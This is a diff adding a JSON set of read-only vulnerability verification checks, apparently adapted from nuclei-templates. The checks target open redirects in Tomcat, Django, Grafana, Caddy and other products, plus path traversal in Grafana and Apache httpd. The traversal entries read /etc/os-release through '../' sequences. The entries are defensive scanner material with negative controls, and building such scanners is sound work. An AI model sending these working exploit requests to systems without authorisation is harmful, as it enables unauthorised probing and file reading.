@@ -1,0 +1,1142 @@
+[
+  {
+    "id": "nv-cve-2018-11784",
+    "kind": "poc",
+    "name": "Apache Tomcat · 开放重定向 · CVE-2018-11784",
+    "description": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "medium",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2018-11784",
+      "cves": [
+        "CVE-2018-11784"
+      ],
+      "category": "open_redirect",
+      "evidence_level": "differential",
+      "summary": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。",
+      "references": [
+        "https://tomcat.apache.org/security-9.html"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2018/CVE-2018-11784.yaml",
+        "sha256": "3e0ad45800d75b4bcaa0bf7f1e0fb5b168e356e3d850bea995ef85087665b05d"
+      }
+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "open_redirect",
+      "cve-2018-11784"
+    ],
+    "applies_to": [
+      "Apache Tomcat"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2018/CVE-2018-11784.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/shen-verify.invalid",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "//shen-verify.invalid",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                301,
+                302,
+                303,
+                307,
+                308
+              ]
+            },
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "nv-cve-2018-14574",
+    "kind": "poc",
+    "name": "Django · 开放重定向 · CVE-2018-14574",
+    "description": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "medium",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2018-14574",
+      "cves": [
+        "CVE-2018-14574"
+      ],
+      "category": "open_redirect",
+      "evidence_level": "differential",
+      "summary": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。",
+      "references": [
+        "https://www.djangoproject.com/weblog/2018/aug/01/security-releases/"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2018/CVE-2018-14574.yaml",
+        "sha256": "a5d2eb3dc03879e79bbeece03981f2cc193aef57e96a27b7d6c4ccbaaa600bb7"
+      }
+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "open_redirect",
+      "cve-2018-14574"
+    ],
+    "applies_to": [
+      "Django"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2018/CVE-2018-14574.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/shen-verify.invalid",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "//shen-verify.invalid",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                301,
+                302,
+                303,
+                307,
+                308
+              ]
+            },
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "nv-cve-2021-29622",
+    "kind": "poc",
+    "name": "Prometheus · 开放重定向 · CVE-2021-29622",
+    "description": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "medium",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2021-29622",
+      "cves": [
+        "CVE-2021-29622"
+      ],
+      "category": "open_redirect",
+      "evidence_level": "differential",
+      "summary": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。",
+      "references": [
+        "https://github.com/prometheus/prometheus/security/advisories/GHSA-vx57-7f4q-fpc7"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2021/CVE-2021-29622.yaml",
+        "sha256": "e94334b34941a80784eac44e84c3a8e606794e66700b7700ea188503a17a113e"
+      }
+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "open_redirect",
+      "cve-2021-29622"
+    ],
+    "applies_to": [
+      "Prometheus"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2021/CVE-2021-29622.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/new/__shen_control",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "/new/newhttp://shen-verify.invalid",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                301,
+                302,
+                303,
+                307,
+                308
+              ]
+            },
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "nv-cve-2022-28923",
+    "kind": "poc",
+    "name": "Caddy · 开放重定向 · CVE-2022-28923",
+    "description": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "medium",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2022-28923",
+      "cves": [
+        "CVE-2022-28923"
+      ],
+      "category": "open_redirect",
+      "evidence_level": "differential",
+      "summary": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。",
+      "references": [
+        "https://github.com/caddyserver/caddy/issues/4502"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2022/CVE-2022-28923.yaml",
+        "sha256": "33b4de95a47c3097be06cfe0234e34b046c5f079bc97ead6cb32c09b0f336b27"
+      }
+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "open_redirect",
+      "cve-2022-28923"
+    ],
+    "applies_to": [
+      "Caddy"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2022/CVE-2022-28923.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/__shen_control/",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "/%5C%5Cshen-verify.invalid/%252e%252e%252f",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                301,
+                302,
+                303,
+                307,
+                308
+              ]
+            },
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "nv-cve-2020-11529",
+    "kind": "poc",
+    "name": "Grav · 开放重定向 · CVE-2020-11529",
+    "description": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "medium",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2020-11529",
+      "cves": [
+        "CVE-2020-11529"
+      ],
+      "category": "open_redirect",
+      "evidence_level": "differential",
+      "summary": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。",
+      "references": [
+        "https://github.com/getgrav/grav/issues/3134"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2020/CVE-2020-11529.yaml",
+        "sha256": "c8a990d3a6ed859504f449134f8af158d9bfa3c724f5528471facbc2e02b3cc5"
+      }
+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "open_redirect",
+      "cve-2020-11529"
+    ],
+    "applies_to": [
+      "Grav"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2020/CVE-2020-11529.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/__shen_control/",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "/%252f%255cshen-verify.invalid%252fa%253fb/",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                301,
+                302,
+                303,
+                307,
+                308
+              ]
+            },
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "nv-cve-2024-57241",
+    "kind": "poc",
+    "name": "DedeCMS · 开放重定向 · CVE-2024-57241",
+    "description": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "medium",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2024-57241",
+      "cves": [
+        "CVE-2024-57241"
+      ],
+      "category": "open_redirect",
+      "evidence_level": "differential",
+      "summary": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。",
+      "references": [
+        "https://github.com/woshidaheike/dedecms-url-redirection"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2024/CVE-2024-57241.yaml",
+        "sha256": "7dc7e6b43a13d47656490bfffdd9d4b6e6f569f91f6923f66866138028006b9e"
+      }
+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "open_redirect",
+      "cve-2024-57241"
+    ],
+    "applies_to": [
+      "DedeCMS"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2024/CVE-2024-57241.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/plus/download.php?open=1&link=L19fc2hlbl9jb250cm9s",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "/plus/download.php?open=1&link=aHR0cHM6Ly9zaGVuLXZlcmlmeS5pbnZhbGlk",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                301,
+                302,
+                303,
+                307,
+                308
+              ]
+            },
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "nv-cve-2023-32068",
+    "kind": "poc",
+    "name": "XWiki · 开放重定向 · CVE-2023-32068",
+    "description": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "medium",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2023-32068",
+      "cves": [
+        "CVE-2023-32068"
+      ],
+      "category": "open_redirect",
+      "evidence_level": "differential",
+      "summary": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。",
+      "references": [
+        "https://jira.xwiki.org/browse/XWIKI-20096"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2023/CVE-2023-32068.yaml",
+        "sha256": "c657286ca7af98f76323399f61c1d2c5c1d5925d0b0c1041ee879ba925b2d22e"
+      }
+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "open_redirect",
+      "cve-2023-32068"
+    ],
+    "applies_to": [
+      "XWiki"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2023/CVE-2023-32068.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/bin/login/XWiki/XWikiLogin?xredirect=/__shen_control",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "/bin/login/XWiki/XWikiLogin?xredirect=//shen-verify.invalid",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                301,
+                302,
+                303,
+                307,
+                308
+              ]
+            },
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "nv-cve-2025-54793",
+    "kind": "poc",
+    "name": "Astro · 开放重定向 · CVE-2025-54793",
+    "description": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "medium",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2025-54793",
+      "cves": [
+        "CVE-2025-54793"
+      ],
+      "category": "open_redirect",
+      "evidence_level": "differential",
+      "summary": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。",
+      "references": [
+        "https://github.com/withastro/astro/security/advisories"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2025/CVE-2025-54793.yaml",
+        "sha256": "9c00be602bdeb7b43678523af2b6a13847feaac63f72ffbb0a4695b32708acf1"
+      }
+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "open_redirect",
+      "cve-2025-54793"
+    ],
+    "applies_to": [
+      "Astro"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2025/CVE-2025-54793.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/shen-verify.invalid/en/",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "//shen-verify.invalid/en/",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                301,
+                302,
+                303,
+                307,
+                308
+              ]
+            },
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*(?:https?:)?//shen-verify\\.invalid(?:[/?#][^\\r\\n]*)?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "nv-cve-2025-4123",
+    "kind": "poc",
+    "name": "Grafana · 开放重定向 · CVE-2025-4123",
+    "description": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "medium",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2025-4123",
+      "cves": [
+        "CVE-2025-4123"
+      ],
+      "category": "open_redirect",
+      "evidence_level": "differential",
+      "summary": "直接检查重定向状态与固定 .invalid 哨兵的 Location，并要求同源阴性对照不返回该重定向；不跟随Location、不请求哨兵主机。",
+      "references": [
+        "https://grafana.com/blog/2025/05/21/grafana-security-release-high-severity-security-fix-for-cve-2025-4123/"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2025/CVE-2025-4123.yaml",
+        "sha256": "70e5abd7529ffee1792a7917782ce5c3db7680466b6265414c1b6ddaa386cf8b"
+      }
+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "open_redirect",
+      "cve-2025-4123"
+    ],
+    "applies_to": [
+      "Grafana"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2025/CVE-2025-4123.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/public/__shen_control",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*/\\\\shen-verify\\.invalid/\\?/\\.\\./\\.\\./?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "/public/..%2F%5cshen-verify.invalid%2F%3f%2F..%2F..",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                301,
+                302,
+                303,
+                307,
+                308
+              ]
+            },
+            {
+              "part": "header",
+              "type": "regex",
+              "regex": [
+                "(?im)^Location:[ \\t]*/\\\\shen-verify\\.invalid/\\?/\\.\\./\\.\\./?[ \\t]*\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "nv-cve-2021-43798",
+    "kind": "poc",
+    "name": "Grafana · 非敏感文件越界读取 · CVE-2021-43798",
+    "description": "仅验证固定非敏感操作系统发行信息文件 /etc/os-release 的越界读取；要求NAME和ID双特征，直接路径与不存在文件两个对照均不含该证据。不读取账户、密钥、配置、会话或业务数据，不尝试命令执行。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "high",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2021-43798",
+      "cves": [
+        "CVE-2021-43798"
+      ],
+      "category": "file_read",
+      "evidence_level": "differential",
+      "summary": "仅验证固定非敏感操作系统发行信息文件 /etc/os-release 的越界读取；要求NAME和ID双特征，直接路径与不存在文件两个对照均不含该证据。不读取账户、密钥、配置、会话或业务数据，不尝试命令执行。",
+      "references": [
+        "https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2021/CVE-2021-43798.yaml",
+        "sha256": "9086c36be285c9206f6ec3013db9b212e9fa798b8bba97494037f0d6df9e9d7b"
+      }
+    },
+    "tags": [
+      "readonly",
+      "verification",
+      "file_read",
+      "cve-2021-43798"
+    ],
+    "applies_to": [
+      "Grafana"
+    ],
+    "source": "https://github.com/projectdiscovery/nuclei-templates/blob/17f5725dc10ced09f464dd2d255c19957aad51e7/http/cves/2021/CVE-2021-43798.yaml (MIT; reviewed read-only adaptation)",
+    "definition": {
+      "service": "http",
+      "condition": "and",
+      "requests": [
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/etc/os-release",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "body",
+              "type": "regex",
+              "regex": [
+                "(?m)^NAME=[^\\r\\n]+\\r?$",
+                "(?m)^ID=[^\\r\\n]+\\r?$"
+              ],
+              "condition": "or",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "probe",
+          "method": "GET",
+          "path": "/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../etc/os-release",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "status",
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "part": "body",
+              "type": "regex",
+              "regex": [
+                "(?m)^NAME=[^\\r\\n]+\\r?$",
+                "(?m)^ID=[^\\r\\n]+\\r?$"
+              ],
+              "condition": "and",
+              "negative": false,
+              "case_sensitive": true
+            }
+          ]
+        },
+        {
+          "role": "control",
+          "method": "GET",
+          "path": "/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../etc/shen-verification-nonexistent-74f986",
+          "headers": {
+            "Cache-Control": "no-store"
+          },
+          "condition": "and",
+          "matchers": [
+            {
+              "part": "body",
+              "type": "regex",
+              "regex": [
+                "(?m)^NAME=[^\\r\\n]+\\r?$",
+                "(?m)^ID=[^\\r\\n]+\\r?$"
+              ],
+              "condition": "or",
+              "negative": true,
+              "case_sensitive": true
+            }
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "nv-cve-2021-41773",
+    "kind": "poc",
+    "name": "Apache HTTP Server · 非敏感文件越界读取 · CVE-2021-41773",
+    "description": "仅验证固定非敏感操作系统发行信息文件 /etc/os-release 的越界读取；要求NAME和ID双特征，直接路径与不存在文件两个对照均不含该证据。不读取账户、密钥、配置、会话或业务数据，不尝试命令执行。 阴性表示本次条件未证实，不代表目标已修复。关联CVE用于定位来源，需结合部署版本确认根因。",
+    "engine": "native",
+    "severity": "high",
+    "enabled": true,
+    "builtin": false,
+    "revision": 1,
+    "purpose": "verification",
+    "verification": {
+      "id": "nv-cve-2021-41773",
+      "cves": [
+        "CVE-2021-41773"
+      ],
+      "category": "file_read",
+      "evidence_level": "differential",
+      "summary": "仅验证固定非敏感操作系统发行信息文件 /etc/os-release 的越界读取；要求NAME和ID双特征，直接路径与不存在文件两个对照均不含该证据。不读取账户、密钥、配置、会话或业务数据，不尝试命令执行。",
+      "references": [
+        "https://httpd.apache.org/security/vulnerabilities_24.html"
+      ],
+      "source_pin": {
+        "source_id": "nuclei-templates",
+        "repository": "https://github.com/projectdiscovery/nuclei-templates",
+        "revision": "17f5725dc10ced09f464dd2d255c19957aad51e7",
+        "path": "http/cves/2021/CVE-2021-41773.yaml",
+        "sha256": "7f5d21b935a782395d1e7471fbad9140f02601e0b2f4eff30e80355ceb8fd630"
+      }
